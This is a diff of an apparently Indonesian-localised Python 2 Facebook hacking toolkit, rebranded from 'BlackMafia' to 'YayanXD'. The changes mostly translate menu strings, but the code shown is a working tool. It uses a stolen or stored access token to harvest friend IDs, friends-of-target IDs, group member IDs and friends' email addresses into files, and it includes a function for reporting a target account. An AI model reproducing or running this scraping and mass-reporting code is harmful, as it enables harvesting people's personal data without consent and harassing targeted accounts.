             save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
             bz = open(save_id, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for ah in z['data']:
                 idfriends.append(ah['id'])
@@ -4438,20 +4434,20 @@ def id_friends():
             print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
             print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_id
             bz.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             asif()
         except IOError:
             print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             asif()
         except (KeyboardInterrupt, EOFError):
             print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mkKeluar \x1b[1;91m]')
             menu()
         except KeyError:
             os.remove(save_id)
             print '\x1b[1;91m[!] An error occurred'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             asif()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
@@ -4472,21 +4468,21 @@ def idfrom_friends():
             os.system('clear')
             print logo6
             print 52 * '\x1b[1;97m\xe2\x95\x90'
-            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
+            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 op = json.loads(jok.text)
                 print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
             except KeyError:
-                print '\x1b[1;91m[!] Not be friends'
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                print '\x1b[1;91m[!] ID Teman salah'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
                 asif()
 
             r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
             z = json.loads(r.text)
             save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mType File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
             bz = open(save_idt, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for ah in z['friends']['data']:
                 idfromfriends.append(ah['id'])
@@ -4498,15 +4494,15 @@ def idfrom_friends():
             print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
             print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_idt
             bz.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             menu()
         except IOError:
             print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             asif()
         except (KeyboardInterrupt, EOFError):
             print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             menu()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
@@ -4533,40 +4529,40 @@ def id_member_grup():
                 asw = json.loads(r.text)
                 print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
             except KeyError:
-                print '\x1b[1;91m[!] Group not found'
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                print '\x1b[1;91m[!] ID Grup Salah'
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
                 asif()
 
             simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
             b = open(simg, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
             s = json.loads(re.text)
             for i in s['data']:
                 idmem.append(i['id'])
                 b.write(i['id'] + '\n')
-                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
+                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + i['name']
                 print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                 print 52 * '\x1b[1;97m\xe2\x95\x90'
 
             print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
             print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
             b.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             asif()
         except IOError:
             print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             menu()
         except (KeyboardInterrupt, EOFError):
             print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mkKeluar \x1b[1;91m]')
             asif()
         except KeyError:
             os.remove(simg)
             print '\x1b[1;91m[!] Group not found'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
             menu()
         except requests.exceptions.ConnectionError:
             print '\x1b[1;91m[\xe2\x9c\x96] No connection'
@@ -4591,7 +4587,7 @@ def email():
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
             a = json.loads(r.text)
             mpsh = open(mails, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             for i in a['data']:
                 x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
@@ -4599,7 +4595,7 @@ def email():
                 try:
                     em.append(z['email'])
                     mpsh.write(z['email'] + '\n')
-                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
+                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                     print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                     print 52 * '\x1b[1;97m\xe2\x95\x90'
                 except KeyError:
@@ -4912,11 +4908,11 @@ def report():
     try:
         os.system('clear')
         print logo3
-        id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
+        id = raw_input(R+'[+]'+G+' Masukan Target Id: '+W)
         my = ("https://m.facebook.com/"+id)
         url = my
         br.open(url)
-        dray = raw_input(R+'[*] '+G+'Do You Want To Report \n'+R+'[+]'+G+' [y/n] :\n'+ G +' BlackMafia ' + R + '  ' + W)
+        dray = raw_input(R+'[*] '+G+'Apakah Anda Ingin Report \n'+R+'[+]'+G+' [y/n] :\n'+ G +' YayanXD ' + R + '  ' + W)
         return rep()    
     except:
         fighter()
@@ -4926,7 +4922,7 @@ def rep():
     if id in y:
         print (R+'.  Oops 405')
         time.sleep(1)
-        time.sleep(R+'Error While Reporting the Id')
+        time.sleep(R+'Kesalahan Saat Melaporkan Id')
         time.sleep(1)
         return test1()
     else:         
